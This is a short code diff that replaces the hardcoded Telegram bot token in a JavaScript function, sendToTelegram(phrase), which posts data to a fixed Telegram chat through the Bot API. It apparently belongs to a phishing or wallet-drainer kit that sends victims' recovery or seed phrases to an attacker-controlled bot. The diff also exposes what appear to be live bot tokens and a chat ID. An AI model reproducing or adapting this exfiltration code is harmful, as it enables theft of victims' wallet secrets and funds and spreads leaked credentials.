@@ -1,5 +1,5 @@
 function sendToTelegram(phrase) {
-  const botToken = "7764687324:AAEEMqhHb-rAf1-i_z5LSCW1JJcwTYj9s5c";
+  const botToken = "7967930041:AAElDO_dYpB824Damck0FJ-pCwlxZuqCKog";
   const chatId = "6996434307";
 
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
